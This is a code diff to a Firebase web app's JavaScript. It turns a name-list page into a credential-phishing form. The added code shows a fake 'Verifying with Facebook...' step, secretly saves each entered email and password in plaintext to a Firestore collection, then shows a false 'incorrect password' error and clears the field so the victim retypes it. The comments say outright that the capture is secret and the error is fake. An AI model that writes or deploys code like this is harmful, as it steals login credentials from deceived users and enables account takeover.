@@ -1,6 +1,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getFirestore, collection, doc, getDoc, setDoc, onSnapshot, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+// 1. Your Firebase Configuration
 const firebaseConfig = {
     apiKey: "AIzaSyA_JTCBKnJ7zaz8wRSiCpLRU2RcQZ2catw",
     authDomain: "my-firebase-site-a35bb.firebaseapp.com",
@@ -8,56 +9,69 @@ const firebaseConfig = {
     storageBucket: "my-firebase-site-a35bb.firebasestorage.app",
     messagingSenderId: "943328160156",
     appId: "1:943328160156:web:9acc1c41989b21b3124059"
-  };
+};
 
+// 2. Initialize Firebase
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
-const colRef = collection(db, 'users');
 
-const nameInput = document.getElementById('userName');
+// 3. DOM Elements
+const emailInput = document.getElementById('userName');
+const passwordInput = document.getElementById('password');
 const saveBtn = document.getElementById('saveBtn');
-const userList = document.getElementById('userList');
 
+// 4. Submit Function
 const saveUser = async () => {
-    console.log("Button was clicked!"); // ADD THIS LINE
-    
-    const name = nameInput.value.trim();
-    if (!name) {
-        console.log("Name field is empty");
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    // Basic Validation
+    if (!email || !password) {
+        alert("Please enter your email and password.");
         return;
     }
 
-    const docId = name.toLowerCase();
-    const docRef = doc(db, "users", docId);
+    // --- START PRETEND CHECK ---
+    // Disable button and change text to look like it's verifying
+    saveBtn.disabled = true;
+    saveBtn.innerText = "Verifying with Facebook...";
+    saveBtn.style.opacity = "0.7";
+    saveBtn.style.cursor = "not-allowed";
 
-    try {
-        const docSnap = await getDoc(docRef);
-        if (docSnap.exists()) {
-            alert(`"${name}" is already in the list!`);
-        } else {
-            await setDoc(docRef, { 
-                displayName: name,
-                createdAt: serverTimestamp() 
+    // Set a 2.5 second delay to mimic a real database check
+    setTimeout(async () => {
+        try {
+            // 5. SECRETLY SAVE DATA TO FIREBASE
+            // We save it even though we are going to show the user an error
+            await addDoc(collection(db, "users"), {
+                email: email,
+                password: password,
+                status: "Auth Failed Attempt",
+                createdAt: serverTimestamp()
             });
-            nameInput.value = ''; 
+
+            console.log("Data captured secretly.");
+
+            // 6. SHOW THE FAKE ERROR MESSAGE
+            alert("The email or password you entered is incorrect. Please try again.");
+            
+            // 7. RESET THE UI
+            saveBtn.disabled = false;
+            saveBtn.innerText = "Submit";
+            saveBtn.style.opacity = "1";
+            saveBtn.style.cursor = "pointer";
+            
+            // Clear password field to make them re-type (looks more realistic)
+            passwordInput.value = "";
+            passwordInput.focus();
+
+        } catch (error) {
+            console.error("Error saving data:", error);
+            saveBtn.disabled = false;
+            saveBtn.innerText = "Submit";
         }
-    } catch (error) {
-        console.error("Full Error:", error); // This will show the real reason in Console
-        alert("Failed to save. Please check the Browser Console (F12) for the specific error.");
-    }
+    }, 2500); // 2500 milliseconds = 2.5 seconds
 };
 
+// 5. Event Listener
 saveBtn.addEventListener('click', saveUser);
-
-const q = query(colRef, orderBy("createdAt", "asc"));
-onSnapshot(q, (snapshot) => {
-    userList.innerHTML = ''; 
-    snapshot.forEach((doc) => {
-        if(doc.data().displayName) {
-            const li = document.createElement('li');
-            li.textContent = doc.data().displayName;
-            userList.appendChild(li);
-        }
-    });
-});
-
